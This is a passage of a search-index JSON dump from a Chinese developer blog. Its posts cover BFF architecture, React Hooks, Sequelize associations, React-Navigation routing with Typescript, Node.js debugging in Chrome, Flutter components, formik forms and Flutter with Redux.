并不是永恒的银弹，能解决一定的问题，同时也会引入一些新的问题。 BFF 的优势： 对于团队来说： 业务支持变多，异构化。 业务层更加的细粒度。 沟通协作变少。 解决问题变快。 数据由前端自控。 对于个人来说： 更合理分工。 做 BFF 可以拓展知识面。 迎接更多的挑战。 抛开话题只谈优点不谈缺点的都是耍流氓。 BFF 的缺点： 结构决定了架构的复杂度。 对于初创的团队来说，前期有一定的学习成本，特别是前端团队。 在期初执行阶段会成为资源瓶颈，在后期会体现出其巨大的价值。 需要专人负责 BFF 建设，给前端带来额外的工作量。 部署、运维需要额外的成本，主要是 Nodejs 的部署。 在 BFF 里也需要编写一份 api 文档。 BFF 可以与 Graphql 结合，解决了文档维护上的问题。 参考资料 Pattern: Backends For Frontends ! 为什么互联网公司开始用 Nodejs 做 web 服务的中间件？有什么好处吗？ Backend For Frontend 蚂蚁财富的 BFF 实践 微服务架构：BFF 和网关是如何演化出来的？ 前后端分离演进：不能微服务，那就使用 BFF 隔离 Techless Web Application 的理念与实践 — 不四 Developer Experience First —— TWA 的理念与实践 Nodejs 在有赞的实践 聊聊 Node.js RPC（一）— 协议 聊聊 Node.js RPC（二）— 服务发现 2019 国内公司前端团队都在搞些什么？ 蚂蚁金服玉伯：我们是如何从前端技术进化到体验科技的？","categories":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/categories/前端/"}],"tags":[{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"}]},{"title":"React Hooks 分享","slug":"React/Hooks/React Hooks 分享","date":"2019-07-27T05:12:38.000Z","updated":"2021-06-15T06:10:52.871Z","comments":true,"path":"/stories/2019/07/React/Hooks/React Hooks 分享/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/React/Hooks/React Hooks 分享/","excerpt":"前言React v16.8 已经推出，hooks 的支持相对也比较好，从今年开始 hooks 已经开始大量的应用了包括了 React 和 React-Native。 今天安利一下一些 hooks 函数，建议感兴趣的实现阅读一些源码，学习一下设计思路和编程规范。","text":"前言React v16.8 已经推出，hooks 的支持相对也比较好，从今年开始 hooks 已经开始大量的应用了包括了 React 和 React-Native。 今天安利一下一些 hooks 函数，建议感兴趣的实现阅读一些源码，学习一下设计思路和编程规范。 use-hooks这是一个 use-hooks 的集中库，里面有非常多好用的 hooks，并且本身是用 typescript 编写的。 https://github.com/zenghongtu/react-use-chinese hooks.guide由社区策划的 React 钩子的集合。 https://www.hooks.guide usehooks由个人编写的 hooks 示例，都非常不错，代码质量很好。 https://usehooks.com awesome-react-hooksawesome 集合，都是一些分散的包，也有不错的东西。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React Hooks 里如何进行性能优化？","slug":"React/Hooks/React Hooks 里如何进行性能优化？","date":"2019-07-26T14:04:31.000Z","updated":"2021-06-15T06:10:52.872Z","comments":true,"path":"/stories/2019/07/React/Hooks/React Hooks 里如何进行性能优化？/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/React/Hooks/React Hooks 里如何进行性能优化？/","excerpt":"前言在 React 里进行性能优化，有一个比较重要的入手点，那就是 shouldComponentUpdate。在 hooks 里虽然没有 shouldComponentUpdate，但是官方为我们提供了 React.memo 这样一个包装器，其默认行为类似 PureComponent 一样会做浅层的对比。","text":"前言在 React 里进行性能优化，有一个比较重要的入手点，那就是 shouldComponentUpdate。在 hooks 里虽然没有 shouldComponentUpdate，但是官方为我们提供了 React.memo 这样一个包装器，其默认行为类似 PureComponent 一样会做浅层的对比。 在 hooks 里进行性能优化利用 React.memo 优化 props，当 props 改变时才会重新渲染，否则就是获取缓存值。 React.memo 不能对比 state，因此需要一些高级的 hash 来解决，比如将 state 变成 props，细粒度的控制 props 的比较。 1234567891011function App() &#123; const Button = React.memo((&#123; title &#125;) =&gt; &#123; // ... &#125;, [title]); return ( &lt;div&gt; &lt;Button title='小明' /&gt; &lt;/div&gt; );&#125; 由于 hooks 不能放在循环里，因此对于列表的操作只能这样。 12345678910111213function Parent(&#123; a, b &#125;) &#123; // Only re-rendered if `a` changes: const child1 = useMemo(() =&gt; &lt;Child1 a=&#123;a&#125; /&gt;, [a]); // Only re-rendered if `b` changes: const child2 = useMemo(() =&gt; &lt;Child2 b=&#123;b&#125; /&gt;, [b]); return ( &lt;&gt; &#123;child1&#125; &#123;child2&#125; &lt;/&gt; );&#125;","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"React Hooks 函数真香","slug":"React/Hooks/React Hooks 函数真香","date":"2019-07-23T13:07:11.000Z","updated":"2021-06-15T06:10:52.871Z","comments":true,"path":"/stories/2019/07/React/Hooks/React Hooks 函数真香/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/React/Hooks/React Hooks 函数真香/","excerpt":"前言React 的更新还在继续，从今年进入 v16 版本以来，现在已经到了 v16.7 了，在 v16 版本里出现了非常多的革命性突破，比如新的异步渲染引擎，新的组件生命周期，新的组件渲染方式等，更是在 v16.7 里提出了一种钩子概念，名为 Hooks。在 v16.8.0 里 hook 得到的官方的真是支持。 下面文章里介绍如何自定义 hook 函数，以一个 useInput 和 useFetchList 为示例。","text":"前言React 的更新还在继续，从今年进入 v16 版本以来，现在已经到了 v16.7 了，在 v16 版本里出现了非常多的革命性突破，比如新的异步渲染引擎，新的组件生命周期，新的组件渲染方式等，更是在 v16.7 里提出了一种钩子概念，名为 Hooks。在 v16.8.0 里 hook 得到的官方的真是支持。 下面文章里介绍如何自定义 hook 函数，以一个 useInput 和 useFetchList 为示例。 Hooks 规则在 Hooks 里有一定的规则限制： 只在函数的顶层使用 Hook。 不要在循环，条件或嵌套函数中调用 Hook。 只从 React Functions 调用 Hook。 表单的双向绑定编写一个自定义的 hook 函数，实现 input 的双向数据绑定，要求代码使用简单简洁。 12345678910111213141516import &#123; useState &#125; from 'react';type TUseInput = &lt;T&gt;(initVal: T) =&gt; [&#123; value: T, onChange: (e: any) =&gt; any &#125;, T];const useInput: TUseInput = (initVal) =&gt; &#123; const [val, setVal] = useState(initVal); const onChange = e =&gt; &#123; const val = e.target.value; setVal(val); &#125;; return [&#123; value: val, onChange &#125;, val];&#125;;export default useInput; 使用的时候（真香）： 12345678910export default () =&gt; &#123; const [name] = useInput('小明'); return ( &lt;div style=&#123;&#123; padding: 20 &#125;&#125;&gt; &lt;input &#123;...iname&#125; /&gt; &lt;p&gt;&#123;name.value&#125;&lt;/p&gt; &lt;/div&gt; );&#125; useInput 真香，解决了 react 表单繁琐的问题。 请求列表的钩子编写一个自定义的 hook 函数，实现列表的数据加载，提供状态值，加载更多等操作，要求代码使用简单简洁。 1234567891011121314151617181920212223242526272829303132333435363738394041424344import &#123; useState, useCallback &#125; from 'react';// 自定义的 hook 函数type State = &#123; list: &#123; id: any, title: string &#125;[], total: number &#125;;type Status = 'uninit' | 'loading' | 'loadmore' | 'finish' | 'full';type UseListApi = &lt;CustomState = any&gt;( api: Function, initState: State &amp; CustomState,) =&gt; [State &amp; CustomState, Status, (id: number) =&gt; any, (id: number) =&gt; any];/** 加载列表的 hook */const useFetchList: UseListApi = (api, initState) =&gt; &#123; // 未初始，加载中，加载更多中，加载完成，没有更多了 const [status, setStatus] = useState&lt;Status&gt;('uninit'); const [state, setState] = useState(initState); // 初始化 const init = useCallback((id: number) =&gt; &#123; setStatus('loading'); return api(id).then(res =&gt; &#123; setState(&#123; ...state as any, ...res &#125;); setStatus('finish'); &#125;); &#125;, [api, state]); // 加载更多 const loadmore = useCallback((id: number) =&gt; &#123; if (state.list.length &gt;= state.total) &#123; setStatus('full'); return; &#125; setStatus('loadmore'); return api(id, state.list.length).then(res =&gt; &#123; setState(&#123; ...state as any, list: [...state.list, ...res.list] &#125;); setStatus('finish'); &#125;); &#125;, [api, state]); return [state, status, init, loadmore];&#125;;export default useFetchList; 使用的时候（真香）： 1234567891011121314151617181920212223242526272829303132333435363738394041import React, &#123; useEffect &#125; from 'react';import useFetchList from './hooks/useFetchList';import useInput from './hooks/useInput';import api from './api';type CustomState = &#123; title: string &#125;;// hooks 组件export default () =&gt; &#123; const [state, status, init, loadmore] = useFetchList&lt;CustomState&gt;(api, &#123; list: [], total: 0, title: 'string', &#125;); const &#123; list &#125; = state; useEffect(() =&gt; &#123; if (status === 'uninit') init(1); &#125;); return ( &lt;div style=&#123;&#123; padding: 20 &#125;&#125;&gt; &#123;status === 'loading' &amp;&amp; &lt;p&gt;加载中...&lt;/p&gt;&#125; &#123;(status === 'finish' || status === 'loadmore') &amp;&amp; list.map(item =&gt; ( &lt;ul key=&#123;item.id&#125;&gt; &lt;li&gt;&#123;item.title&#125;&lt;/li&gt; &lt;/ul&gt; )) &#125; &#123;status === 'loadmore' &amp;&amp; &lt;p&gt;加载更多中...&lt;/p&gt;&#125; &#123;status === 'finish' &amp;&amp; &lt;div&gt; &lt;button onClick=&#123;_ =&gt; loadmore(1)&#125;&gt;加载更多&lt;/button&gt; &lt;/div&gt; &#125; &#123;status === 'full' &amp;&amp; &lt;p&gt;没有更多了&lt;/p&gt;&#125; &lt;/div&gt; );&#125;; 写了这个 hook 函数之后，可以在任何列表加载里使用，可以说是相比类组件的方式节省了非常多的代码。","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Sequelize 关系式查询","slug":"Mysql/Sequelize 关系式查询","date":"2019-07-21T04:13:27.000Z","updated":"2021-06-15T06:10:52.829Z","comments":true,"path":"/stories/2019/07/Mysql/Sequelize 关系式查询/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/Mysql/Sequelize 关系式查询/","excerpt":"前言Sequelize 是 Nodejs 的一个关系式数据库的 ROM，支持 Postgres、MySQL、SQLite 和 Microsoft SQL Server. 它具有强大的事务支持，关联关系，读取和复制等功能。 值得高兴的是 Sequelize 有中文文档，本文也是根据中文文档进行介绍与学习。本文介绍 Sequelize 里的关系式查询。","text":"前言Sequelize 是 Nodejs 的一个关系式数据库的 ROM，支持 Postgres、MySQL、SQLite 和 Microsoft SQL Server. 它具有强大的事务支持，关联关系，读取和复制等功能。 值得高兴的是 Sequelize 有中文文档，本文也是根据中文文档进行介绍与学习。本文介绍 Sequelize 里的关系式查询。 关系关系一般有三种：一对一、一对多、多对多。Sequelize 提供了清晰易用的接口来定义关系、进行表间的操作。 当说到关系查询时，一般会需要获取多张表的数据。有建议用连表查询 join 的，有不建议的。我的看法是，join 查询这种黑科技在数据量小的情况下可以使用，基本没有什么影响，数据量大的时候，join 的性能可能会是硬伤，应该尽量避免，可以分别根据索引取单表数据然后在应用层对数据进行 join、merge。当然，查询时一定要分页，不要 findAll。 一对一关系一对一关系可以简单描述为为某个表添加外部关联键的关系。因为是一对一，因此不同添加两种以上的关系。 先来看看怎么添加一对一的关系。 123456789101112131415161718const Account = sequelize.define('account', &#123; email: &#123; type: Sequelize.CHAR(20), allowNull: false &#125;,&#125;);const User = sequelize.define('user', &#123; name: &#123; type: Sequelize.CHAR(10), allowNull: false, &#125;,&#125;);// 在 User 里添加 account 关系，拥有 get/set/addAccountUser.hasOne(Account);// 在 Account 里添加 User 关系，拥有 get/set/addUserAccount.belongsTo(User); 这样一来创建表后他们的关系是。 1234567891011121314151617CREATE TABLE IF NOT EXISTS `users` ( `id` INTEGER NOT NULL auto_increment , `name` CHAR(10) NOT NULL, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, PRIMARY KEY (`id`)) ENGINE=InnoDB;CREATE TABLE IF NOT EXISTS `accounts` ( `id` INTEGER NOT NULL auto_increment , `email` CHAR(20) NOT NULL, `created_at` DATETIME NOT NULL, `updated_at` DATETIME NOT NULL, `user_id` INTEGER, PRIMARY KEY (`id`), FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL ON UPDATE CASCADE) ENGINE=InnoDB; 在 accounts 表里创建了一个 FOREIGN KEY 约束为 users 表的 id，并且设置了两个特性：1.（SET NULL）从父表删除或更新行，2.（CASCADE）从父表删除或更新且自动删除或更新子表中匹配的行。 查询的时候只需要，添加 include 就是一个关系查询的过程了。 123456789101112const user = await User.findById(1, &#123; include: [Account]&#125;);console.log(user.get(&#123; plain: true &#125;));// 同理const users = await User.findAll(&#123; include: [Account]&#125;);console.log(users.map(i =&gt; i.get(&#123; plain: true &#125;))); 在应用层保证一致性时，就需要我们遵循良好的编码约定。新增就用 user.createAccount，更改就用 user.setAccount。 1234const user = await User.create(&#123; name : '小明' &#125;);const account = user.createAccount(&#123; email: 'abc@123.com' &#125;);console.log(account.get(&#123; plain: true &#125;)); 未完成！","categories":[{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/categories/Mysql/"}],"tags":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"数据库","slug":"数据库","permalink":"http://me.lizhooh.com/tags/数据库/"},{"name":"Mysql","slug":"Mysql","permalink":"http://me.lizhooh.com/tags/Mysql/"}]},{"title":"React-Navigation + Typescript 路由系统","slug":"React Native/Router/React-Navigation + Typescript 路由系统","date":"2019-07-17T07:17:09.000Z","updated":"2021-06-15T06:10:52.868Z","comments":true,"path":"/stories/2019/07/React Native/Router/React-Navigation + Typescript 路由系统/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/React Native/Router/React-Navigation + Typescript 路由系统/","excerpt":"前言React Navigation 源于 React Native 社区对一个可扩展且易于使用的导航解决方案的需求，它完全使用 JavaScript 编写。React Navigation 所有内容都是使用 JavaScript 在 React Native 的基础上编写的。动画使用 Animated API 及其 Native 驱动程序选项，以便在主线程上运行动画并生成平滑的 60 fps 切换动效。 在本节的内容里将使用 React-Navigation + Typescript 定制一个良好的路由系统，采用单一路由器的原则，通过 Typescript 提供良好的类型检查与类型提示。","text":"前言React Navigation 源于 React Native 社区对一个可扩展且易于使用的导航解决方案的需求，它完全使用 JavaScript 编写。React Navigation 所有内容都是使用 JavaScript 在 React Native 的基础上编写的。动画使用 Animated API 及其 Native 驱动程序选项，以便在主线程上运行动画并生成平滑的 60 fps 切换动效。 在本节的内容里将使用 React-Navigation + Typescript 定制一个良好的路由系统，采用单一路由器的原则，通过 Typescript 提供良好的类型检查与类型提示。 一共分为两部分： 路由表设计 路由器设计 有以下的目录结构： 123456- src - routes // 路由表目录 - router // 路由器目录 - views // 页面目录 - app.tsx - index.tsx 路由表路由表的设计，在一个文件里进行配置，这样做是为了通过统一的配置，我们可以避免路由规则逻辑散落在多个地方，从而出现未知的冲突，集中在一起我们可以更方便的来查看全局的路由规则。 12345678910111213141516171819202122232425import &#123; createStackNavigator &#125; from 'react-navigation';import App from '@/views/App';import Home from '@/views/Home';// 路由表export const screen = &#123; app: App, home: Home,&#125;;// 页面的参数类型export type ScreenParams = &#123; app: any, home: &#123; id: number, &#125;,&#125;;// 创建路由栈export default createStackNavigator(screen, &#123; initialRouteName: 'app', mode: 'modal', headerMode: 'none',&#125;); 说明： 这里做的事情很简单，第一个是编写路由表。 其次是编写每一个页面的导航参数。 最后创建路由栈，并制定初始化的路由页。 路由器路由器采用全局单一的路由器，这样可以不需要依赖上下文（this.props.navigate）来进行导航，无论在哪里，都可以直接通过 router.push/router.pop 进行导航操作。 12345678910111213141516171819202122232425262728293031import &#123; NavigationActions &#125; from 'react-navigation';import &#123; screen, ScreenParams &#125; from '@/routes';type ScreenKey = keyof typeof screen;class Router &#123; private navigator = null; private dispatch(cb: any) &#123; if (this.navigator) &#123; this.navigator.dispatch(cb); return; &#125; console.warn('navigator is null'); &#125; update(nav: any) &#123; this.navigator = nav; &#125; /** 路由栈里入栈一个页面 */ push&lt;K extends ScreenKey&gt;(name: K, params?: ScreenParams[K]) &#123; this.dispatch(NavigationActions.navigate(&#123; routeName: name, params, &#125;)); &#125; /** 路由栈里弹出一个页面 */ pop() &#123; this.dispatch(NavigationActions.back()); &#125;&#125;export default new Router(); 说明： 编写了一个类型封装，一个路由的操作函数。 利用 Typescript 的强大类型推断系统，在调用 push 时提供智能提示，包含参数提示。 与 React Navigation 结合好接下来，将 Router 整合到 React Navigation 里。 1234567891011import React from &apos;react&apos;;import &#123; createAppContainer &#125; from &apos;react-navigation&apos;;import App from &apos;@/routes&apos;;import Router from &apos;@/router&apos;;const AppContainer = createAppContainer(App);export default () =&gt; ( &lt;AppContainer ref=&#123;Router.update&#125; /&gt;); 在页面里使用路由器。 1234567891011121314151617181920212223242526272829import React, &#123; useState &#125; from &apos;react&apos;;import &#123; StyleSheet, View, Text, TouchableOpacity as Touch,&#125; from &apos;react-native&apos;;import router from &apos;@/router&apos;;export default () =&gt; &#123; const [count, update] = useState(0); const onPress = e =&gt; &#123; update(count + 1); router.push(&apos;app&apos;); &#125;; return ( &lt;View style=&#123;styles.root&#125;&gt; &lt;Text style=&#123;styles.text&#125;&gt;&#123;count&#125;&lt;/Text&gt; &lt;Touch activeOpacity=&#123;0.75&#125; style=&#123;styles.touch&#125; onPress=&#123;onPress&#125;&gt; &lt;Text style=&#123;styles.touchText&#125;&gt;+ 1&lt;/Text&gt; &lt;/Touch&gt; &lt;/View&gt; );&#125; 路径别名最后，为了没有方便的引入，在 tsconfig.json 里配置别名，也就是上面为什么使用 @xxx 引入路径。 123456789101112... \"compilerOptions\": &#123; ... \"baseUrl\": \"src\", // 别名的基础路径 \"rootDir\": \".\", ... \"paths\": &#123; \"@/router\": [\"router/index\"], // 基础路径已经有 src 了，这里就不需要 src 开头 \"@/routes\": [\"routes/index\"], \"@/views/*\": [\"views/*\"] &#125; &#125;, 小结Typescript 很强，React Navigation 也很强。 本文的示例代码在：react-native-typescript-demo","categories":[{"name":"React Native","slug":"React-Native","permalink":"http://me.lizhooh.com/categories/React-Native/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"学习笔记","slug":"学习笔记","permalink":"http://me.lizhooh.com/tags/学习笔记/"},{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"React-Native","slug":"React-Native","permalink":"http://me.lizhooh.com/tags/React-Native/"}]},{"title":"Nodejs 使用 Chrome 调试指南","slug":"Nodejs/Nodejs 使用 Chrome 调试指南","date":"2019-07-10T13:59:44.000Z","updated":"2021-06-15T06:10:52.837Z","comments":true,"path":"/stories/2019/07/Nodejs/Nodejs 使用 Chrome 调试指南/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/Nodejs/Nodejs 使用 Chrome 调试指南/","excerpt":"前言在 Nodejs 里可以使用 --inspect 和 chrome 进行调试，使用 chrome 调试的好处时可以在 chrome console 上展开深层次的对象，可以在 sources 里进行断点调试等。 连接 chrome首先打开 chrome://inspect/#devices，将第二个选项选中，打开可以看到有 localhost:9222 和 localhost:9229 两个地址，这是默认的调试地址。","text":"前言在 Nodejs 里可以使用 --inspect 和 chrome 进行调试，使用 chrome 调试的好处时可以在 chrome console 上展开深层次的对象，可以在 sources 里进行断点调试等。 连接 chrome首先打开 chrome://inspect/#devices，将第二个选项选中，打开可以看到有 localhost:9222 和 localhost:9229 两个地址，这是默认的调试地址。 点击 Open dedicated DevTools for Node 可以打开连接设备。或者按 F12 打开控制台，点击 node 的小图标打开。 这是 Nodejs 调试器。打开调试器可以做什么？可以在 console 里查看变量，可以在 sources 里打断点等。 点击 Add connecion 可以添加连接的地址。 使用 inspect在 vscode 上先打上断点，然后按 F5，这时候会随机的生成一个调试端口，没关系我们手动运行远程调试。 1node --inspect-brk=9229 index.js 连上之后就可以这样的画面，由于打了断点，程序在某个位置下停止了。 接下来可以按 F11 （下一步），按 F8 进行执行。 在 console 里可以看到输出的信息，并且可以进行展开来看哦。","categories":[{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/categories/Nodejs/"}],"tags":[{"name":"后端","slug":"后端","permalink":"http://me.lizhooh.com/tags/后端/"},{"name":"Nodejs","slug":"Nodejs","permalink":"http://me.lizhooh.com/tags/Nodejs/"},{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"}]},{"title":"Flutter 组件分类","slug":"Flutter/Flutter 组件分类","date":"2019-07-01T14:11:42.000Z","updated":"2021-06-15T06:10:52.816Z","comments":true,"path":"/stories/2019/07/Flutter/Flutter 组件分类/","link":"","permalink":"http://me.lizhooh.com/stories/2019/07/Flutter/Flutter 组件分类/","excerpt":"前言组件化编程就像是搭积木一样的开发。把整个应用拆分成许多部分，每部分各自管理自己的组件以及数据状态，这样达到一个更好的可维护性，可扩展性。 在 Flutter 里可以根据有无状态分为两类的组件： 有状态组件（StatefulWidget） 无状态组件（StatelessWidget） 根据组件的声明也可以分为两类： 类组件（class component） 函数组件（function component）","text":"前言组件化编程就像是搭积木一样的开发。把整个应用拆分成许多部分，每部分各自管理自己的组件以及数据状态，这样达到一个更好的可维护性，可扩展性。 在 Flutter 里可以根据有无状态分为两类的组件： 有状态组件（StatefulWidget） 无状态组件（StatelessWidget） 根据组件的声明也可以分为两类： 类组件（class component） 函数组件（function component） 有状态组件有状态组件写法比较绕，因为要写两个类，一个类是包装类，第二个类才是状态类，props 通过 widget.xxx 来获取，显得有点麻烦。 12345678910111213141516171819import 'package:flutter/material.dart';class Title extends StatefulWidget &#123; Title(&#123; this.text = '' &#125;); final String text; @override createState() =&gt; new _Title(&#123; text: text &#125;);&#125;class _Title extends State&lt;Title&gt; &#123; @override Widget build(BuildContext context) &#123; return new Center( child: new Text(text), ); &#125;&#125; 不知为什么，它就不能写成只有一个类的形式。 无状态组件无状态组件里没有生命周期函数，也没有 setState。 类组件无状态类组件，需要继承的是 StatelessWidget，其组件的 props 通过构造函数的参数注入，并且需要重写父类的 build 方法。 1234567891011import 'package:flutter/material.dart';class Title extends StatelessWidget &#123; MyView(&#123; this.text = '' &#125;); final String text; @override Widget build(BuildContext context) &#123; return Text(text, style: TextStyle(fontSize: 18)); &#125;&#125; 函数组件无状态函数组件，实际上并不算是一个组件形式，也可以认为是一个组件形式。 函数组件只是通过函数的方式返回一个 Widget，其参数可以认为是组件的 props。 123Widget title(&#123; text: '' &#125;) &#123; return Text(text, style: TextStyle(fontSize: 18));&#125; 可以看出无状态函数组件比无状态类组件代码更加简洁明了。","categories":[{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/categories/Flutter/"}],"tags":[{"name":"移动开发","slug":"移动开发","permalink":"http://me.lizhooh.com/tags/移动开发/"},{"name":"Flutter","slug":"Flutter","permalink":"http://me.lizhooh.com/tags/Flutter/"},{"name":"Dart","slug":"Dart","permalink":"http://me.lizhooh.com/tags/Dart/"}]},{"title":"解决 React 表单处理的痛点","slug":"React/React/解决 React 表单处理的痛点","date":"2019-06-28T01:12:18.000Z","updated":"2021-06-15T06:10:52.881Z","comments":true,"path":"/stories/2019/06/React/React/解决 React 表单处理的痛点/","link":"","permalink":"http://me.lizhooh.com/stories/2019/06/React/React/解决 React 表单处理的痛点/","excerpt":"前言表单处理应该是前端开发比较繁琐的处理方式了。使用 React 开发应用时，为了更好地管理应用中的数据，响应用户的输入，编写组件的时候呢，我们就会运用到受控组件与非受控组件这两个概念。 在 React 里更推荐使用受控组件，这样就能够将 state 与表单组件的数据关联，而不是独立的管理，但是这样面临一个问题，就是表单的数据直接变得非常的复杂。 本文就使用了一个 React 表单处理的库：formik，来解决这些表单处理与数据验证的复杂问题。","text":"前言表单处理应该是前端开发比较繁琐的处理方式了。使用 React 开发应用时，为了更好地管理应用中的数据，响应用户的输入，编写组件的时候呢，我们就会运用到受控组件与非受控组件这两个概念。 在 React 里更推荐使用受控组件，这样就能够将 state 与表单组件的数据关联，而不是独立的管理，但是这样面临一个问题，就是表单的数据直接变得非常的复杂。 本文就使用了一个 React 表单处理的库：formik，来解决这些表单处理与数据验证的复杂问题。 基本使用formik 为我们解决的是： 获取表单状态的值和表单状态。 验证和错误消息。 处理表单提交。 表单在 React 会显得非常的冗长，就如下面的代码一样。 12345678910111213141516171819202122232425262728293031class App extends React.Component &#123; constructor(props) &#123; super(props); this.state = &#123; account: '', password: '', &#125;; &#125; onChange = (e, type) =&gt; &#123; const value = e.target.value; if (type === 'account') &#123; // .... &#125; &#125; render() &#123; const &#123; account, password &#125; = this.state; return ( &lt;div&gt; &lt;input type='text' value=&#123;account&#125; onChange=&#123;e =&gt; this.onChange(e, 'account')&#125; /&gt; &lt;input type='password' value=&#123;password&#125; onChange=&#123;e =&gt; this.onChange(e, 'password')&#125; /&gt; &lt;/div&gt; ); &#125;&#125; 说明： 这里有两个表单输入控件，实际的开发里会面临上 10 个输入控件。 代码已经尽量控制，但是还是有所偏差。 使用了 formik 之后，就变成这样： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950import &#123; Formik &#125; from 'formik';const onValidate = () =&gt; &#123; let errors = &#123;&#125;; if (!values.email) &#123; errors.email = 'Required'; &#125; else if (!/^[A-Z0-9._%+-]+@[A-Z0-9.-]+\\.[A-Z]&#123;2,&#125;$/i.test(values.email)) &#123; errors.email = 'Invalid email address'; &#125; return errors;&#125;;const onSubmit = (values, &#123; setSubmitting &#125;) =&gt; &#123; setTimeout(() =&gt; &#123; alert(JSON.stringify(values, null, 2)); setSubmitting(false); &#125;, 400);&#125;;const BindInput = (&#123; filed, type, props &#125;) =&gt; ( &lt;div&gt; &lt;input type=&#123;type&#125; onChange=&#123;props.handleChange&#125; onBlur=&#123;props.handleBlur&#125; value=&#123;values[filed]&#125; /&gt; &lt;span&gt; &#123;(props.errors[filed] &amp;&amp; props.touched[filed]) ? props.errors[filed]&#125; : '' &lt;/span&gt; &lt;/div&gt;);const App = () =&gt; ( &lt;Formik // 初始变量 initialValues=&#123;&#123; email: '', password: '' &#125;&#125; validate=&#123;onValidate&#125; onSubmit=&#123;onSubmit&#125;&gt; &#123;props =&gt; ( &lt;form onSubmit=&#123;handleSubmit&#125;&gt; &lt;BindInput filed='email' type='text' props=&#123;props&#125; /&gt; &lt;BindInput filed='password' type='password' props=&#123;props&#125; /&gt; &lt;button type='submit' disabled=&#123;isSubmitting&#125;&gt;提交&lt;/button&gt; &lt;/form&gt; )&#125; &lt;/Formik&gt;); 说明： 在 formik 里自己维护 state，使用 render props 的方式，把主动权交给了开发者。 formik 提供了错误类型，当前数据量等属性，可以让你自主的渲染。 除此之外 formik 还提供了比较简便的方式，连 render props 都不用写。 12345678910111213141516171819import React from 'react';import &#123; Formik, Form, Field &#125; from 'formik';export const App = () =&gt; ( &lt;Formik initialValues=&#123;&#123; data: &#123; account: '', password: '', &#125;, &#125;&#125; onSubmit=&#123;values =&gt; &#123; console.log(values); &#125;&#125;&gt; &lt;Field name='data.account' /&gt; &lt;Field name='data.password' /&gt; &lt;button type='submit'&gt;提交&lt;/button&gt; &lt;/Formik&gt;); 题外话 · hooks在 react hooks 出现之后，关于表单的处理会相对比较轻松与简单。例如我写了一个 react-hooks-input-bind 的 hook，几乎实现了在 react 上的双向绑定效果。 12345678910111213141516171819import React from 'react';import useBind from 'react-hooks-input-bind';export default () =&gt; &#123; const [state, bind] = useBind(&#123; name: 'hello', // 初始值 age: '20', &#125;); return ( &lt;div&gt; &lt;h3&gt;&#123;state.name&#125;&lt;/h3&gt; &lt;input &#123;...bind.name&#125; /&gt; &lt;h3&gt;&#123;state.age&#125;&lt;/h3&gt; &lt;input &#123;...bind.age&#125; /&gt; &lt;/div&gt; );&#125; 参考资料 https://github.com/jaredpalmer/formik","categories":[{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/categories/React/"}],"tags":[{"name":"Javascript","slug":"Javascript","permalink":"http://me.lizhooh.com/tags/Javascript/"},{"name":"前端","slug":"前端","permalink":"http://me.lizhooh.com/tags/前端/"},{"name":"React","slug":"React","permalink":"http://me.lizhooh.com/tags/React/"}]},{"title":"Flutter + Redux 进行数据状态管理","slug":"Flutter/Flutter + Redux 进行数据状态管理","date":"2019-06-23T08:09:15.000Z","updated":"2021-06-15T06:10:52.816Z","comments":true,"path":"/stories/2019/06/Flutter/Flutter + Redux 进行数据状态管理/","link":"","permalink":"http://me.lizhooh.com/stories/2019/06/Flutter/Flutter + Redux 进行数据状态管理/","excerpt":"前言在上一节（Flutter + Redux 使用指南）里，介绍了如何在 flutter 里使用 redux，内容比较简单，并且这种方式在代码编写上有点局限性，在本节里主要是对现有的代码进行整理与封装，让整个 stores 的代码更加灵活，简便。","text":"前言在上一节（Flutter + Redux 使用指南）里，介绍了如何在 flutter 里使用 redux，内容比较简单，并且这种方式在代码编写上有点局限性，在本节里主要是对现有的代码进行整理与封装，让整个 stores 的代码更加灵活，简便。 代码目录先看一下代码的目录结构： 12345678910- lib - main.dart - stores - index.dart - state.dart - models - index.dart - other.dart - utils - log.dart 其中： stores/state.dart 是负责初始化 state 和创建 reducer 的。 stores/index.dart 是负责创建 store 和导出一些可用函数。 models 里放着模型的代码，一个模型就包含了 State 类和 Action 类。 定义 Model以 index 为例，在一个 model 里只有 state 和 action。state 是描述数据，action 是决定如何改变数据。 123456789101112131415161718192021222324import 